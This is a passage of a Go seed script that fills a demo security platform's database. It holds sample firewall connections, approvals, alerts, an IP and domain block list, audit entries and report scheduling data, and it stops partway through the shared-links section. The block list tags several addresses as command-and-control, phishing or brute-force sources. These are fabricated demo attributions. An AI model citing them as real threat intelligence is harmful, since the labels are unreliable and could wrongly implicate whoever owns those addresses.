		mustExec(db, `INSERT INTO fwe_threats (tenant_id, threat_type, src_ip, dst_ip, src_port, dst_port, protocol, country, action_taken, severity, confidence, rule_triggered, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,'tcp',$7,$8,$9,$10,$11,$12)`,
			tid, t.ttype, t.srcIP, t.dstIP, t.srcP, t.dstP,
			t.country, t.action, t.sev, t.conf, t.rule,
			now.Add(-time.Duration(t.minsAgo)*time.Minute),
		)
	}

	// ── live connections ─────────────────────────────────────────────────────
	type fweConn struct {
		id, srcIP, dstIP, proto, app, state, zsrc, zdst, rule string
		srcP, dstP, dur                                        int
		bsent, brecv                                           int64
	}
	connRows := []fweConn{
		{"CONN-001", "10.5.1.100", "203.0.113.50", "tcp", "HTTPS", "established", "lan", "wan", "RULE-003", 54321, 443, 1823, 48234, 189234},
		{"CONN-002", "10.10.20.5", "8.8.8.8", "udp", "DNS", "established", "lan", "wan", "RULE-011", 33481, 53, 12, 512, 1024},
		{"CONN-003", "192.168.100.10", "10.0.1.80", "tcp", "HTTP", "established", "dmz", "lan", "RULE-015", 80, 45234, 3920, 892341, 124230},
		{"CONN-004", "10.200.0.42", "10.10.5.10", "tcp", "SSH", "established", "vpn", "srv", "RULE-022", 22, 62341, 412, 84231, 2341},
		{"CONN-005", "10.0.0.15", "172.217.14.196", "tcp", "HTTPS", "established", "lan", "wan", "RULE-003", 53221, 443, 892, 23412, 84231},
		{"CONN-006", "10.5.3.22", "192.168.100.10", "tcp", "HTTP", "established", "lan", "dmz", "RULE-018", 45123, 80, 234, 12342, 34521},
		{"CONN-007", "192.168.200.15", "8.8.4.4", "udp", "DNS", "established", "guest", "wan", "RULE-031", 51234, 53, 5, 64, 128},
		{"CONN-008", "10.10.5.20", "10.10.5.25", "tcp", "MySQL", "established", "srv", "srv", "RULE-040", 3306, 34521, 9823, 423100, 84231},
	}
	for _, c := range connRows {
		mustExec(db, `INSERT INTO fwe_connections (tenant_id, src_ip, src_port, dst_ip, dst_port, protocol, application, state, bytes_sent, bytes_recv, duration, zone_src, zone_dst, rule_id, started_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)`,
			tid, c.srcIP, c.srcP, c.dstIP, c.dstP, c.proto, c.app, c.state,
			c.bsent, c.brecv, c.dur, c.zsrc, c.zdst, c.rule,
			now.Add(-time.Duration(c.dur)*time.Second),
		)
	}

	// ── approvals ────────────────────────────────────────────────────────────
	type fweApproval struct {
		id, ctype, desc, requester, approver, status, priority, note string
		daysAgo                                                       int
	}
	approvalRows := []fweApproval{
		{"APR-001", "internet_facing", "Allow TCP/8443 from WAN to web cluster 192.168.100.0/28", "alice.zhang@corp.com", "", "pending", "high", "", 0},
		{"APR-002", "production_firewall", "Block all ICMP echo from guest VLAN to server farm", "bob.patel@corp.com", "", "pending", "medium", "", 0},
		{"APR-003", "rule_deletion", "Remove legacy FTP allow rule (POL-001 rule #47)", "alice.zhang@corp.com", "carol.kim@corp.com", "approved", "high", "Confirmed legacy rule, safe to remove", -3},
		{"APR-004", "internet_facing", "Open port 25565 for Minecraft server (dev team request)", "dave.m@corp.com", "carol.kim@corp.com", "rejected", "low", "Not approved for production; use dev environment", -5},
		{"APR-005", "high_risk", "Disable IPS signatures for SSL inspection on video streaming CIDRs", "eve.t@corp.com", "carol.kim@corp.com", "approved", "critical", "Approved with 30-day review window", -7},
		{"APR-006", "default_policy", "Change default policy from log to deny for DMZ ingress", "alice.zhang@corp.com", "carol.kim@corp.com", "approved", "critical", "Aligned with security hardening initiative", -14},
	}
	for _, a := range approvalRows {
		var decidedAt interface{} = nil
		if a.status != "pending" {
			decidedAt = now.Add(time.Duration(a.daysAgo) * 24 * time.Hour)
		}
		mustExec(db, `INSERT INTO fwe_approvals (tenant_id, change_type, description, requester, approver, status, priority, decision_note, decided_at, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)`,
			tid, a.ctype, a.desc, a.requester, a.approver, a.status, a.priority, a.note,
			decidedAt, now.Add(time.Duration(a.daysAgo-1)*24*time.Hour),
		)
	}

	// ── notifications ────────────────────────────────────────────────────────
	type fweNotif struct {
		etype, title, msg, sev, ruleID, srcIP string
		minsAgo                               int
		read                                  bool
	}
	notifRows := []fweNotif{
		{"threat_blocked", "Critical Threat Blocked", "C2 beacon from 185.220.101.47 blocked on port 443", "critical", "RULE-C2-001", "185.220.101.47", 2, false},
		{"approval_required", "Approval Requested", "New internet-facing rule requires approval — TCP/8443 to web cluster", "high", "", "", 5, false},
		{"rule_modified", "Firewall Rule Modified", "Rule 'Allow HTTPS Inbound' priority changed from 10 to 5", "medium", "RULE-003", "", 30, false},
		{"threat_blocked", "DDoS Attempt Mitigated", "SYN flood from CN targeting port 80 — rate limiting applied", "critical", "RULE-DDOS-001", "Multiple", 60, true},
		{"high_hit_count", "High Hit Count Alert", "Rule RULE-PS-001 hit count exceeded 10,000 in last hour", "medium", "RULE-PS-001", "", 90, true},
		{"firewall_offline", "Firewall Health Warning", "Standby firewall unit FW-02 failed heartbeat check", "high", "", "", 120, true},
		{"config_changed", "Policy Version Update", "Internet Perimeter Policy updated to v3 by alice.zhang@corp.com", "info", "", "", 180, true},
		{"block_added", "Threat Intel Block Added", "45 new malicious IPs from threat feed added to block list", "medium", "", "", 360, true},
		{"approval_required", "Approval Requested", "Default DMZ policy change pending review", "critical", "", "", 480, false},
	}
	for _, n := range notifRows {
		mustExec(db, `INSERT INTO fwe_notifications (tenant_id, event_type, title, message, severity, rule_id, src_ip, read, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, n.etype, n.title, n.msg, n.sev, n.ruleID, n.srcIP, n.read,
			now.Add(-time.Duration(n.minsAgo)*time.Minute),
		)
	}

	// ── blocked list ─────────────────────────────────────────────────────────
	type fweBlock struct {
		btype, value, reason, by string
		hrsUntilExpiry           int
	}
	blockRows := []fweBlock{
		{"ip", "45.33.32.156", "Port scan source detected by IDS", "ids-auto", 0},
		{"ip", "91.108.4.200", "Brute force SSH attempts", "ids-auto", 24},
		{"ip", "185.220.101.47", "Known C2 server (Cobalt Strike)", "threat-intel", 0},
		{"ip", "198.51.100.0", "Malicious IP range from threat feed", "alice.zhang@corp.com", 0},
		{"ip", "5.188.206.26", "Threat intelligence match (TI-022)", "threat-intel", 0},
		{"domain", "malware-c2.example.net", "Known malware C2 domain", "threat-intel", 0},
		{"domain", "phishing-login.evil-corp.org", "Phishing domain — credential harvesting", "alice.zhang@corp.com", 168},
		{"country", "KP", "Nation-state threat actor — North Korea", "security@corp.com", 0},
		{"application", "BitTorrent", "P2P traffic not permitted on corporate network", "alice.zhang@corp.com", 0},
		{"ip", "103.21.244.0", "ASN used for scanning infrastructure", "threat-intel", 0},
	}
	for _, b := range blockRows {
		var expiresAt interface{} = nil
		if b.hrsUntilExpiry > 0 {
			expiresAt = now.Add(time.Duration(b.hrsUntilExpiry) * time.Hour)
		}
		mustExec(db, `INSERT INTO fwe_blocked (tenant_id, block_type, value, reason, blocked_by, expires_at)
			VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT DO NOTHING`,
			tid, b.btype, b.value, b.reason, b.by, expiresAt,
		)
	}

	// ── audit trail ──────────────────────────────────────────────────────────
	type fweAuditRow struct {
		action, otype, oid, oname, actor, details string
		minsAgo                                   int
	}
	auditRows := []fweAuditRow{
		{"rule_added", "firewall_rule", "RULE-055", "Allow DevOps Monitoring HTTPS", "alice.zhang@corp.com", "Added allow rule for Datadog agent on port 443", 5},
		{"rule_modified", "firewall_rule", "RULE-003", "Allow HTTPS Inbound", "alice.zhang@corp.com", "Changed priority from 10 to 5 — urgent security hardening", 30},
		{"block_added", "blocked_ip", "45.33.32.156", "45.33.32.156", "ids-auto", "Automated block: port scan detected (>1000 ports in 60s)", 62},
		{"policy_modified", "policy", "POL-001", "Internet Perimeter Policy", "carol.kim@corp.com", "Updated to v3: added DDoS rate limiting rules", 180},
		{"nat_created", "nat_rule", "NAT-008", "Cloud VPC Dynamic NAT", "bob.patel@corp.com", "New NAT for AWS VPC peering — DR readiness", 240},
		{"zone_created", "zone", "ZONE-CLOUD", "Cloud Egress", "bob.patel@corp.com", "New zone for cloud egress traffic", 241},
		{"approval_approved", "approval", "APR-005", "Disable IPS for video streaming", "carol.kim@corp.com", "Approved with condition: 30-day review window mandatory", 168 * 60},
		{"rule_deleted", "firewall_rule", "RULE-047", "Legacy FTP Allow (any to any)", "alice.zhang@corp.com", "Approval APR-003 satisfied — legacy FTP rule removed", 72 * 60},
		{"policy_created", "policy", "POL-006", "Server Farm Policy", "carol.kim@corp.com", "New strict policy for production server segment", 720 * 60},
		{"approval_rejected", "approval", "APR-004", "Minecraft server port forward", "carol.kim@corp.com", "Rejected: personal gaming traffic not permitted", 120 * 60},
		{"block_added", "blocked_domain", "phishing-login.evil-corp.org", "phishing-login.evil-corp.org", "alice.zhang@corp.com", "Phishing domain reported by user, blocked immediately", 1440},
		{"report_generated", "report", "RPT-2025-07", "Threat Blocking Report", "alice.zhang@corp.com", "Monthly threat blocking report generated for July 2025", 2880},
		{"policy_modified", "policy", "POL-003", "DMZ Policy", "alice.zhang@corp.com", "Changed default deny rule — unmatched DMZ traffic now dropped", 43200},
	}
	for _, a := range auditRows {
		mustExec(db, `INSERT INTO fwe_audit (tenant_id, action, object_type, object_id, object_name, actor, details, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, a.action, a.otype, a.oid, a.oname, a.actor, a.details,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
		)
	}

	log.Printf("Firewall enterprise seed: %d policies, %d zones, %d NAT, %d threats, %d conns, %d approvals, %d notifs, %d blocks, %d audit",
		len(policies), len(zones), len(natRules), len(threatRows), len(connRows), len(approvalRows), len(notifRows), len(blockRows), len(auditRows))
}

func seedReportsEnterprise(db *sql.DB) {
	const tid = 9999
	now := time.Now()

	// ── tables ──────────────────────────────────────────────────────────────
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_reports (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		report_id TEXT NOT NULL, name TEXT NOT NULL, description TEXT,
		category TEXT NOT NULL DEFAULT 'security',
		report_type TEXT NOT NULL DEFAULT 'custom',
		template_id TEXT, data_sources TEXT DEFAULT '[]',
		filters TEXT DEFAULT '{}', sections TEXT DEFAULT '[]',
		owner TEXT NOT NULL DEFAULT 'system',
		status TEXT NOT NULL DEFAULT 'active',
		tags TEXT DEFAULT '[]',
		last_generated_at TIMESTAMP, last_generated_by TEXT,
		generation_count INTEGER DEFAULT 0, schedule_id TEXT,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(),
		UNIQUE(tenant_id, report_id)
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_templates (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		template_id TEXT NOT NULL, name TEXT NOT NULL,
		description TEXT, category TEXT NOT NULL DEFAULT 'security',
		is_builtin BOOLEAN DEFAULT FALSE,
		sections TEXT DEFAULT '[]',
		default_data_sources TEXT DEFAULT '[]',
		default_filters TEXT DEFAULT '{}',
		thumbnail TEXT, owner TEXT,
		use_count INTEGER DEFAULT 0,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(),
		UNIQUE(tenant_id, template_id)
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_schedules (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		schedule_id TEXT NOT NULL, report_id TEXT NOT NULL,
		report_name TEXT NOT NULL,
		frequency TEXT NOT NULL DEFAULT 'weekly',
		cron_expr TEXT,
		delivery_method TEXT NOT NULL DEFAULT 'email',
		recipients TEXT DEFAULT '[]',
		webhook_url TEXT, cloud_bucket TEXT,
		export_format TEXT NOT NULL DEFAULT 'pdf',
		status TEXT NOT NULL DEFAULT 'active',
		last_run_at TIMESTAMP, next_run_at TIMESTAMP,
		run_count INTEGER DEFAULT 0,
		success_count INTEGER DEFAULT 0, failure_count INTEGER DEFAULT 0,
		created_by TEXT NOT NULL DEFAULT 'system',
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(),
		UNIQUE(tenant_id, schedule_id)
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_executions (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		execution_id TEXT NOT NULL,
		report_id TEXT NOT NULL, report_name TEXT NOT NULL,
		schedule_id TEXT,
		started_at TIMESTAMP DEFAULT NOW(), completed_at TIMESTAMP,
		duration_ms INTEGER,
		status TEXT NOT NULL DEFAULT 'running',
		export_format TEXT DEFAULT 'pdf',
		triggered_by TEXT NOT NULL DEFAULT 'manual',
		executed_by TEXT NOT NULL DEFAULT 'system',
		file_size_bytes BIGINT DEFAULT 0,
		error_message TEXT, download_url TEXT,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_exports (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		export_id TEXT NOT NULL,
		report_id TEXT NOT NULL, report_name TEXT NOT NULL,
		execution_id TEXT,
		format TEXT NOT NULL DEFAULT 'pdf',
		file_size_bytes BIGINT DEFAULT 0,
		exported_by TEXT NOT NULL,
		download_url TEXT, expires_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_versions (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		report_id TEXT NOT NULL, version INTEGER NOT NULL DEFAULT 1,
		author TEXT NOT NULL, changes TEXT,
		snapshot TEXT DEFAULT '{}', generated_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_shared (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		share_id TEXT NOT NULL UNIQUE,
		report_id TEXT NOT NULL, report_name TEXT NOT NULL,
		execution_id TEXT, shared_by TEXT NOT NULL,
		share_type TEXT NOT NULL DEFAULT 'internal',
		password_hash TEXT, allowed_roles TEXT DEFAULT '[]',
		view_count INTEGER DEFAULT 0, expires_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_notifications (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		event_type TEXT NOT NULL,
		title TEXT NOT NULL, message TEXT NOT NULL,
		report_id TEXT, report_name TEXT,
		severity TEXT NOT NULL DEFAULT 'info',
		read BOOLEAN DEFAULT FALSE,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS rpe_audit (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		action TEXT NOT NULL, object_type TEXT NOT NULL,
		object_id TEXT, object_name TEXT,
		actor TEXT NOT NULL, details TEXT,
		created_at TIMESTAMP DEFAULT NOW()
	)`)

	// ── built-in templates ──────────────────────────────────────────────────
	type rpeTemplate struct {
		id, name, desc, category string
		sections, sources        string
	}
	templates := []rpeTemplate{
		{"TPL-001", "Executive Summary", "High-level security posture for board and leadership", "executive",
			`["Executive Summary","Key Metrics KPIs","Threat Analysis","Compliance Scores","Recommendations"]`,
			`["SIEM","EDR","Vulnerability Management"]`},
		{"TPL-002", "Weekly SOC Report", "Operational security report for SOC team", "security",
			`["Executive Summary","Alert Summary","Incident Timeline","Detection Coverage","Threat Analysis","Recommendations"]`,
			`["SIEM","EDR","SOAR"]`},
		{"TPL-003", "Incident Report", "Detailed incident documentation and root cause analysis", "incident_response",
			`["Incident Timeline","Affected Assets","Root Cause Analysis","MITRE ATT&CK Mapping","Lessons Learned","Recommendations"]`,
			`["SIEM","EDR","SOAR","Threat Intelligence"]`},
		{"TPL-004", "Compliance Assessment", "Regulatory compliance status across frameworks", "compliance",
			`["Executive Summary","Compliance Scores","Failed Controls","Remediation Progress","Appendix"]`,
			`["CMDB","Audit Logs","Vulnerability Management"]`},
		{"TPL-005", "Vulnerability Assessment", "Full vulnerability scan results and prioritization", "vulnerability",
			`["Executive Summary","Key Metrics KPIs","Vulnerability Table","Risk Prioritization","Patch Status","Asset Exposure"]`,
			`["Vulnerability Management","CMDB","EDR"]`},
		{"TPL-006", "Threat Intelligence Report", "Threat actor activity, IOCs and campaign analysis", "security",
			`["Executive Summary","Threat Actor Profiles","Active Campaigns","IOC Summary","MITRE ATT&CK Mapping","Recommendations"]`,
			`["Threat Intelligence","SIEM","Firewall"]`},
		{"TPL-007", "Risk Posture Report", "Organizational risk score and business impact analysis", "executive",
			`["Executive Summary","Risk Score","Business Impact","Top Risk Assets","Trend Graphs","Recommendations"]`,
			`["SIEM","Vulnerability Management","CMDB","EDR"]`},
		{"TPL-008", "Asset Inventory", "Complete inventory of hardware, software and cloud assets", "asset",
			`["Executive Summary","Asset Inventory","Software Inventory","Hardware Inventory","CMDB Report","Mobile Device Report"]`,
			`["CMDB","EDR","Active Directory","Kubernetes"]`},
		{"TPL-009", "Security Operations", "SOC KPIs, MTTR, MTTD and operational metrics", "security",
			`["Executive Summary","Key Metrics KPIs","Alert Analytics","SLA Summary","Detection Coverage","Recommendations"]`,
			`["SIEM","SOAR","EDR"]`},
	}
	for _, t := range templates {
		mustExec(db, `INSERT INTO rpe_templates (tenant_id, template_id, name, description, category, is_builtin, sections, default_data_sources)
			VALUES ($1,$2,$3,$4,$5,TRUE,$6,$7) ON CONFLICT DO NOTHING`,
			tid, t.id, t.name, t.desc, t.category, t.sections, t.sources,
		)
	}

	// ── reports ─────────────────────────────────────────────────────────────
	type rpeReport struct {
		id, name, desc, category, rtype, owner, tags string
		genCount                                      int
		daysAgo                                       int
	}
	reports := []rpeReport{
		{"RPT-001", "Weekly SOC Report — W28 2025", "Weekly security operations center digest", "security", "Weekly SOC Report", "alice.zhang@corp.com", `["soc","weekly","security"]`, 4, 0},
		{"RPT-002", "Executive Security Briefing — July 2025", "Monthly executive security summary for board", "executive", "Executive Briefing", "carol.kim@corp.com", `["executive","monthly","board"]`, 12, 2},
		{"RPT-003", "PCI DSS Compliance Assessment Q2", "Quarterly PCI DSS compliance check", "compliance", "PCI DSS", "bob.patel@corp.com", `["compliance","pci","quarterly"]`, 3, 5},
		{"RPT-004", "Vulnerability Assessment — Production", "Full vulnerability scan of production environment", "vulnerability", "Vulnerability Assessment", "alice.zhang@corp.com", `["vulnerability","production","critical"]`, 8, 1},
		{"RPT-005", "Threat Intelligence Report — July", "Monthly threat intel digest and IOC analysis", "security", "Threat Intelligence Report", "dave.m@corp.com", `["threat-intel","monthly","ioc"]`, 6, 3},
		{"RPT-006", "Incident Report — IR-2025-0047", "Post-incident report for brute force campaign", "incident_response", "Incident Report", "alice.zhang@corp.com", `["incident","brute-force","post-mortem"]`, 1, 7},
		{"RPT-007", "MITRE ATT&CK Coverage Analysis", "Detection coverage mapped to MITRE ATT&CK framework", "detection", "MITRE ATT&CK Coverage", "bob.patel@corp.com", `["mitre","detection","coverage"]`, 5, 4},
		{"RPT-008", "ISO 27001 Readiness Assessment", "ISO 27001 control compliance and gap analysis", "compliance", "ISO 27001", "carol.kim@corp.com", `["iso27001","compliance","audit"]`, 2, 14},
		{"RPT-009", "Endpoint Health Report — July", "EDR agent coverage and endpoint health status", "endpoint_network", "Endpoint Health", "bob.patel@corp.com", `["endpoint","health","coverage"]`, 7, 1},
		{"RPT-010", "NIST CSF Assessment", "NIST Cybersecurity Framework maturity assessment", "compliance", "NIST CSF", "carol.kim@corp.com", `["nist","compliance","framework"]`, 3, 21},
		{"RPT-011", "SOC 2 Type II Preparation Report", "SOC 2 readiness gap analysis", "compliance", "SOC 2", "carol.kim@corp.com", `["soc2","compliance","audit"]`, 1, 30},
		{"RPT-012", "Alert Analytics — Q2 2025", "Alert volume trends, false positive rates and detection efficacy", "detection", "Alert Analytics", "alice.zhang@corp.com", `["alerts","analytics","q2"]`, 2, 10},
		{"RPT-013", "Asset Inventory Report", "Full CMDB asset inventory with risk scoring", "asset", "Asset Inventory", "bob.patel@corp.com", `["assets","cmdb","inventory"]`, 4, 6},
		{"RPT-014", "Daily SOC Report — 2025-07-17", "Daily SOC operational report", "security", "Daily SOC Report", "alice.zhang@corp.com", `["soc","daily"]`, 16, 0},
		{"RPT-015", "Risk Posture Summary — July 2025", "Monthly organizational risk score and business impact", "executive", "Risk Score", "carol.kim@corp.com", `["risk","posture","executive"]`, 5, 3},
		{"RPT-016", "Firewall Activity Report — July", "Firewall rule hits, blocks and NAT activity", "endpoint_network", "Firewall Activity", "bob.patel@corp.com", `["firewall","network","activity"]`, 3, 2},
		{"RPT-017", "Patch Status Report — July 2025", "Patch compliance and remediation progress", "vulnerability", "Patch Status", "dave.m@corp.com", `["patching","compliance","remediation"]`, 4, 1},
		{"RPT-018", "GDPR Compliance Review", "GDPR data protection controls and gap assessment", "compliance", "GDPR", "carol.kim@corp.com", `["gdpr","compliance","privacy"]`, 1, 45},
	}
	for _, r := range reports {
		var lastGenAt interface{} = nil
		var lastGenBy interface{} = nil
		if r.genCount > 0 {
			t2 := now.Add(-time.Duration(r.daysAgo)*24*time.Hour + 2*time.Hour)
			lastGenAt = t2
			lastGenBy = "alice.zhang@corp.com"
		}
		mustExec(db, `INSERT INTO rpe_reports (tenant_id, report_id, name, description, category, report_type, owner, tags, generation_count, last_generated_at, last_generated_by, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13) ON CONFLICT DO NOTHING`,
			tid, r.id, r.name, r.desc, r.category, r.rtype, r.owner, r.tags, r.genCount,
			lastGenAt, lastGenBy,
			now.Add(-time.Duration(r.daysAgo+7)*24*time.Hour),
			now.Add(-time.Duration(r.daysAgo)*24*time.Hour),
		)
	}

	// ── schedules ────────────────────────────────────────────────────────────
	type rpeSchedule struct {
		id, reportID, reportName, freq, delivery, format string
		recipients                                        string
		runCount, successCount, failureCount              int
		daysAgoLastRun, hoursUntilNext                    int
		status                                            string
	}
	schedules := []rpeSchedule{
		{"SCH-001", "RPT-014", "Daily SOC Report — 2025-07-17", "daily", "email", "pdf", `["soc-team@corp.com","alice.zhang@corp.com"]`, 183, 180, 3, 1, 20, "active"},
		{"SCH-002", "RPT-001", "Weekly SOC Report — W28 2025", "weekly", "email", "pdf", `["leadership@corp.com","soc-team@corp.com"]`, 52, 50, 2, 7, 144, "active"},
		{"SCH-003", "RPT-002", "Executive Security Briefing — July 2025", "monthly", "email", "pdf", `["ciso@corp.com","board@corp.com"]`, 12, 12, 0, 30, 720, "active"},
		{"SCH-004", "RPT-004", "Vulnerability Assessment — Production", "weekly", "download_portal", "xlsx", `[]`, 26, 25, 1, 7, 120, "active"},
		{"SCH-005", "RPT-005", "Threat Intelligence Report — July", "monthly", "webhook", "json", `[]`, 6, 6, 0, 30, 600, "active"},
		{"SCH-006", "RPT-013", "Asset Inventory Report", "monthly", "cloud_storage", "csv", `[]`, 3, 3, 0, 30, 480, "active"},
		{"SCH-007", "RPT-017", "Patch Status Report — July 2025", "weekly", "email", "pdf", `["devops@corp.com","security@corp.com"]`, 8, 7, 1, 3, 96, "active"},
		{"SCH-008", "RPT-007", "MITRE ATT&CK Coverage Analysis", "quarterly", "email", "pdf", `["ciso@corp.com"]`, 2, 2, 0, 90, 2160, "paused"},
	}
	for _, s := range schedules {
		lastRun := now.Add(-time.Duration(s.daysAgoLastRun) * 24 * time.Hour)
		nextRun := now.Add(time.Duration(s.hoursUntilNext) * time.Hour)
		mustExec(db, `INSERT INTO rpe_schedules (tenant_id, schedule_id, report_id, report_name, frequency, delivery_method, recipients, export_format, status, last_run_at, next_run_at, run_count, success_count, failure_count, created_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,'alice.zhang@corp.com') ON CONFLICT DO NOTHING`,
			tid, s.id, s.reportID, s.reportName, s.freq, s.delivery, s.recipients, s.format, s.status,
			lastRun, nextRun, s.runCount, s.successCount, s.failureCount,
		)
	}

	// ── executions ────────────────────────────────────────────────────────────
	type rpeExecution struct {
		id, reportID, reportName, status, format, triggeredBy, executedBy string
		durationMs                                                         int
		fileSizeBytes                                                      int64
		minsAgo                                                            int
	}
	executions := []rpeExecution{
		{"EXC-001", "RPT-014", "Daily SOC Report — 2025-07-17", "completed", "pdf", "scheduled", "system", 2341, 284320, 5},
		{"EXC-002", "RPT-001", "Weekly SOC Report — W28 2025", "completed", "pdf", "manual", "alice.zhang@corp.com", 4821, 512480, 30},
		{"EXC-003", "RPT-004", "Vulnerability Assessment — Production", "completed", "xlsx", "scheduled", "system", 8932, 1284320, 120},
		{"EXC-004", "RPT-002", "Executive Security Briefing — July 2025", "completed", "pdf", "manual", "carol.kim@corp.com", 3214, 384210, 180},
		{"EXC-005", "RPT-005", "Threat Intelligence Report — July", "completed", "json", "scheduled", "system", 1823, 128340, 720},
		{"EXC-006", "RPT-007", "MITRE ATT&CK Coverage Analysis", "completed", "pdf", "manual", "bob.patel@corp.com", 6421, 921840, 1440},
		{"EXC-007", "RPT-015", "Risk Posture Summary — July 2025", "completed", "pdf", "scheduled", "system", 2913, 312840, 2160},
		{"EXC-008", "RPT-009", "Endpoint Health Report — July", "failed", "pdf", "scheduled", "system", 0, 0, 2880},
		{"EXC-009", "RPT-009", "Endpoint Health Report — July", "completed", "pdf", "manual", "alice.zhang@corp.com", 5123, 423480, 2900},
		{"EXC-010", "RPT-003", "PCI DSS Compliance Assessment Q2", "completed", "pdf", "manual", "bob.patel@corp.com", 7823, 892340, 4320},
		{"EXC-011", "RPT-017", "Patch Status Report — July 2025", "completed", "pdf", "scheduled", "system", 3214, 284120, 72},
		{"EXC-012", "RPT-016", "Firewall Activity Report — July", "completed", "pdf", "manual", "bob.patel@corp.com", 4123, 412830, 48},
		{"EXC-013", "RPT-014", "Daily SOC Report — 2025-07-17", "completed", "pdf", "scheduled", "system", 2198, 279840, 1445},
		{"EXC-014", "RPT-012", "Alert Analytics — Q2 2025", "completed", "xlsx", "manual", "alice.zhang@corp.com", 5832, 682340, 240},
		{"EXC-015", "RPT-013", "Asset Inventory Report", "completed", "csv", "scheduled", "system", 9234, 1823840, 720},
	}
	for _, e := range executions {
		startedAt := now.Add(-time.Duration(e.minsAgo) * time.Minute)
		var completedAt interface{} = nil
		var errorMsg interface{} = nil
		if e.status == "completed" {
			t2 := startedAt.Add(time.Duration(e.durationMs) * time.Millisecond)
			completedAt = t2
		} else if e.status == "failed" {
			completedAt = startedAt.Add(500 * time.Millisecond)
			errorMsg = "EDR data source timeout after 30s — retry scheduled"
		}
		var dlURL interface{} = nil
		if e.status == "completed" {
			dlURL = "/api/rpe/download/" + e.id
		}
		mustExec(db, `INSERT INTO rpe_executions (tenant_id, execution_id, report_id, report_name, started_at, completed_at, duration_ms, status, export_format, triggered_by, executed_by, file_size_bytes, error_message, download_url)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)`,
			tid, e.id, e.reportID, e.reportName, startedAt, completedAt, e.durationMs,
			e.status, e.format, e.triggeredBy, e.executedBy, e.fileSizeBytes, errorMsg, dlURL,
		)
	}

	// ── exports ──────────────────────────────────────────────────────────────
	type rpeExport struct {
		id, reportID, reportName, execID, format, exportedBy string
		fileSize                                              int64
		minsAgo                                               int
	}
	exports := []rpeExport{
		{"EXP-001", "RPT-001", "Weekly SOC Report — W28 2025", "EXC-002", "pdf", "alice.zhang@corp.com", 512480, 32},
		{"EXP-002", "RPT-004", "Vulnerability Assessment — Production", "EXC-003", "xlsx", "alice.zhang@corp.com", 1284320, 125},
		{"EXP-003", "RPT-002", "Executive Security Briefing — July 2025", "EXC-004", "pdf", "carol.kim@corp.com", 384210, 185},
		{"EXP-004", "RPT-007", "MITRE ATT&CK Coverage Analysis", "EXC-006", "pdf", "bob.patel@corp.com", 921840, 1442},
		{"EXP-005", "RPT-003", "PCI DSS Compliance Assessment Q2", "EXC-010", "pdf", "bob.patel@corp.com", 892340, 4325},
		{"EXP-006", "RPT-014", "Daily SOC Report — 2025-07-17", "EXC-001", "pdf", "system", 284320, 6},
		{"EXP-007", "RPT-012", "Alert Analytics — Q2 2025", "EXC-014", "xlsx", "alice.zhang@corp.com", 682340, 242},
		{"EXP-008", "RPT-013", "Asset Inventory Report", "EXC-015", "csv", "system", 1823840, 725},
	}
	for _, e := range exports {
		mustExec(db, `INSERT INTO rpe_exports (tenant_id, export_id, report_id, report_name, execution_id, format, file_size_bytes, exported_by, download_url, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)`,
			tid, e.id, e.reportID, e.reportName, e.execID, e.format, e.fileSize, e.exportedBy,
			"/api/rpe/download/"+e.execID,
			now.Add(-time.Duration(e.minsAgo)*time.Minute),
		)
	}

	// ── shared links ──────────────────────────────────────────────────────────
	type rpeShare struct {
		id, reportID, reportName, execID, sharedBy, shareType string
		viewCount, hrsExpiry                                   int
		minsAgo                                                int
	}
	shares := []rpeShare{
		{"SHR-001", "RPT-002", "Executive Security Briefing — July 2025", "EXC-004", "carol.kim@corp.com", "external", 7, 168, 185},
		{"SHR-002", "RPT-003", "PCI DSS Compliance Assessment Q2", "EXC-010", "bob.patel@corp.com", "external", 3, 720, 4325},
		{"SHR-003", "RPT-001", "Weekly SOC Report — W28 2025", "EXC-002", "alice.zhang@corp.com", "internal", 12, 0, 32},
		{"SHR-004", "RPT-015", "Risk Posture Summary — July 2025", "EXC-007", "carol.kim@corp.com", "internal", 5, 0, 2165},
	}
